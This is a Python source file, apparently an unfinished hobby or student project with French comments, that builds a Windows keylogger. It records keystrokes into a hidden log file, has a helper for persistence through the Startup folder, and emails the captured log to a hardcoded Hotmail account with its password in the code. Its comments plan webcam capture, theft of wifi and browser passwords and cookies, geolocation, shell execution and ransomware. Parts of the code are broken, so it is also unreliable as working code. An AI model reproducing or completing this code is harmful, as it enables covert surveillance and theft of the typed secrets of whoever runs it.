import os
import importlib



my_imports = ["socket", "keyboard", "smtplib", "datetime", "time", "pynput"]
my_modules = {}
###########################################################################
# for every lib we need we try to import it and if we can't we install it #
###########################################################################
def import_or_install(modulename):
    try:
        my_modules[modulename] = importlib.import_module(modulename)
        import_verif = True
    except:
        os.system(f"pip3 install {modulename}")

for imports in my_imports:
    import_or_install(imports)

import_verif = False
while(import_verif == False):
    try:
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
        import_verif = True
    except:
        os.system("pip3 install email")
    
# import Key and Listener from pynput.keyboard
try:
    from pynput.keyboard import Key, Listener
except:
    os.system("pip3 install pynput")
    from pynput.keyboard import Key, Listener


##############################################################################################
# la fonction create_log_file et send_log_mail fonctionnent pour le keylogger                #
# faire une class pour le keylogger ???                                                      #
# reste a faire : camera + extraction mdp wifi / dans le navigateur(ou cookie de connection) #
#  + géoloc + shell_exec maybe ransoware si besoin et si temps diviser le prog en fonction   #
# des besoins gerer le cas où les libs sont pas présentes ou absence de cam ou autre         # 
#  essayer de voir comment on peut séparer les différentes fonctionnalités dans le code      #
##############################################################################################

def write_in_startup(filename, file_content):
    """
    fonction permettant d'écrire en créant un nouveau fichier dans le dossier startup
    prend deux arguements, le nom du fichier et son contenu
    """
    username = os.getlogin()
    path_to_startup = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}"  
    file = open(path_to_startup,"w")
    file.write(file_content)

def send_file_mail(file="./log.txt"):
    """
    fonction permettant d'envoyer un fichier par mail 
    """
    email = "sending.address420@hotmail.com"
    message = MIMEMultipart()
    message["From"] = email                   # sender email address
    message['To'] = email                     # receiving email address 
    message['Subject'] = f"keylogger file of {str(my_modules['datetime'].datetime.now())[:22]}" # mail subject
    attachment = open(file,'rb')              # reading into file
    obj = MIMEBase('application', 'octet-stream') # content type header 
    obj.set_payload((attachment).read())      # set attachment to the email
    encoders.encode_base64(obj)               # base64 encode the attachment 
    obj.add_header('Content-Disposition',f"attachment; filename={file}")  # add header 
    message.attach(obj)                       
    my_message = message.as_string()
    email_session = my_modules['smtplib'].SMTP('smtp.outlook.com',587)
    email_session.starttls()
    email_session.login(email,'havefuninlife<3')
    email_session.sendmail(email, email,my_message)
    email_session.quit()
    print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")


def start():
    if keyl_listening == False:
        keyl_listening = True

def stop():
    if keyl == True:
        keyl = False

def is_working():
    return keyl

def create_log_file():
    
    log = open("./log.txt", "a+") # open the file in appending mode or create it if not existing 
    os.system("attrib +h ./log.txt")  # hide the file 
    
def erase_last_caracter(filepath):
    with open(filepath, 'rb+') as filehandle:
        filehandle.seek(-1, os.SEEK_END)
        filehandle.truncate()

#def send_data():
#    send_file_mail(stored_data)    

def on_press(key):
    global log
    if key == Key.space:
        log.write(" ")
    elif key == Key.backspace:
        erase_last_caracter(log)
    elif key == Key.tab:
        log.write("    ")
    elif key == Key.enter:
        log.write("\n\r ")
    else:
        log.write(str(key)[1])

def on_release(key):
    if key == Key.esc:
        return False



def keyl():
    """ 
    fonction dans laquelle on gèrera tout ce qui est en lien avec le keyl 
    et qui aura son propre thread
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def main():
    create_log_file()
    keyl()
    
    #ip = "172.20.69.182"
    #port = 9999

    #server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #server.sendto()
    
    
if __name__ == '__main__':
    main()